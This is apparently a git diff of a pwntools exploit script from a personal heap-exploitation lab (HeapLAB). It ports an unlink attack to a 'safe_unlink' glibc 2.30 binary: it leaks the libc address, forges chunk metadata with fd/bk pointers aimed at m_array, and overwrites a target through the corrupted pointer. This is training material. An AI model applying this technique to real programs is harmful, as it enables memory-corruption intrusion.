@@ -1,13 +1,12 @@
 #!/usr/bin/python3
 from pwn import *
 
-elf = context.binary = ELF("unsafe_unlink")
+elf = context.binary = ELF("safe_unlink")
 libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again
 
 gs = '''
-set solib-search-path /home/huhu/CTF-writeups/pwn/heaplab/HeapLAB/.glibc/glibc_2.23_unsafe-unlink/
 continue
-
+set solib-search-path /home/huhu/CTF-writeups/pwn/heaplab/HeapLAB/.glibc/glibc_2.30_no-tcache/
 '''
 def start():
     if args.GDB:
@@ -46,19 +45,30 @@ io = start()
 # This binary leaks the address of puts(), use it to resolve the libc load address.
 io.recvuntil(b"puts() @ ")
 libc.address = int(io.recvline(), 16) - libc.sym.puts
-
-# This binary leaks the heap start address.
-io.recvuntil(b"heap @ ")
-heap = int(io.recvline(), 16)
 io.recvuntil(b"> ")
 io.timeout = 0.1
 
 # =============================================================================
 
-hehe = malloc(0x88)
-huhu = malloc(0x88)
-edit(hehe, p64(0xdeadbeef) + p64(0xdeadbeef) + (96+16) * p8(0x0) + p64(0x90) + p64(0x90))
-free(1)
+# =-=-=- EXAMPLE -=-=-=
+
+# Print the address of m_array, where the program stores pointers to its allocated chunks.
+info(f"m_array @ 0x{elf.sym.m_array:02x}")
+
+# Request 2 small chunks.
+chunk_A = malloc(0x88)
+chunk_B = malloc(0x88)
+
+# Prepare fake chunk metadata.
+fd = elf.sym.m_array - 0x18
+bk = elf.sym.m_array - 0x10
+prev_size = 0x80
+fake_size = 0x90
+edit(chunk_A, p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))
+
+free(chunk_B)
+edit(0, p64(0)*3 + p64(elf.sym.target))
+edit(0, b"Much win")
 # =============================================================================
 
 io.interactive()
